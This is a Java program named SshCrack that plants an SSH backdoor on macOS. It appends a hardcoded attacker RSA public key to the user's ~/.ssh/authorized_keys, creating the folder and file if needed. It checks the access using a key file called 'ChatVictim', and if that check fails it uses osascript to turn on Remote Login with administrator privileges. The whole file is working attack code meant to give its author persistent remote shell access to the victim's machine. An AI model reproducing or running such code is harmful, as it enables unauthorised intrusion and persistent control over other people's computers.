import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;

/**
 * Created by 40095 on 1/19/15.
 */
public class SshCrack {
    public static void main(String[] args) {
        Path sshFolder = Paths.get(System.getProperty("user.home") + "/.ssh");
        Path authKeys = Paths.get(System.getProperty("user.home") + "/.ssh/authorized_keys");

        if (Files.notExists(sshFolder)) {
            createSshFolder();
            createAuthKeys();
        } else {
            System.out.println("~/.ssh exists");
        }
        if (Files.notExists(authKeys)) {
            createAuthKeys();
        } else {
            System.out.println("Key file exists");
        }

        try {
            ArrayList<String> contents = new ArrayList<String>();
            BufferedReader br2 = new BufferedReader(new FileReader(System.getProperty("user.home") + "/.ssh/authorized_keys"));

            String sCurrentLine;

            while ((sCurrentLine = br2.readLine()) != null) {
                contents.add(sCurrentLine);
            }
            if (!contents.contains("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy63yarp+N9yS8RkDe4jLl6d5lOXaY241t2hyjsXhqHjwKuHJQsFLLLuw94vR3b2Oqio00Y41rHwDtEm89E0oKWa3+ph7PQfpxL4too+DzfoIb4baJE1nMbgag8oRB3Y8OhnJauuJqw+GcKpLUK2mFLL+xZNkB97YDSY+qrIgJv8z39VDdat9iowlld0k4ZGMcbN90AmiES2NnjIhEwaGkOdP6nC0sf7qkORaexsDJ8gFM+X36UxZDxd/ZpLI11hifR+6vBCylI0ybvGuaA0Cr/PlfW9H/qcaPAdUUiNzClbtBFe/oGAw8BEQIlsIuDgfx4T30CrPMLaFH0KlETmej 40095@2016-40125.local")) {
                System.out.println("key not found");

                System.out.println("Writing Key");
                PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(System.getProperty("user.home") + "/.ssh/authorized_keys", true)));
                out.println("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy63yarp+N9yS8RkDe4jLl6d5lOXaY241t2hyjsXhqHjwKuHJQsFLLLuw94vR3b2Oqio00Y41rHwDtEm89E0oKWa3+ph7PQfpxL4too+DzfoIb4baJE1nMbgag8oRB3Y8OhnJauuJqw+GcKpLUK2mFLL+xZNkB97YDSY+qrIgJv8z39VDdat9iowlld0k4ZGMcbN90AmiES2NnjIhEwaGkOdP6nC0sf7qkORaexsDJ8gFM+X36UxZDxd/ZpLI11hifR+6vBCylI0ybvGuaA0Cr/PlfW9H/qcaPAdUUiNzClbtBFe/oGAw8BEQIlsIuDgfx4T30CrPMLaFH0KlETmej 40095@2016-40125.local");
                out.close();
            }
            System.out.println("Key found");

            int end = 255;
            String[] ssh = {"ssh", "-t", "-t", "-i", System.getProperty("user.home") + "/.ssh/ChatVictim", "127.0.0.1", "exit"};
            try {
                Process process = Runtime.getRuntime().exec(ssh);
                StreamGobbler out = new StreamGobbler(process.getInputStream());
                out.start();
                end = process.waitFor();
                System.out.println(end);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if(end != 0) {
                String[] activateSshArgs = {"osascript", "-e", "do shell script \"systemsetup -setremotelogin on\" with administrator privileges"};
                Runtime.getRuntime().exec(activateSshArgs   );
            }

        } catch (IOException ex) {
           ex.printStackTrace();
        }

    }

    private static void createAuthKeys() {
        System.out.println("Key file does not exist");
        String[] cmd = {"touch", System.getProperty("user.home") + "/.ssh/authorized_keys"};
        try {
            int end = Runtime.getRuntime().exec(cmd).waitFor();
            if (end == 0)
                System.out.println("Key file created");
            else
                System.out.println("Error: " + end);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }

    private static void createSshFolder() {
        System.out.println("~/.ssh does not exist");
        String[] cmd = {"mkdir", System.getProperty("user.home") + "/.ssh"};
        try {
            int end = Runtime.getRuntime().exec(cmd).waitFor();
            if (end == 0)
                System.out.println("~/.ssh created");
            else
                System.out.println("Error: " + end);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
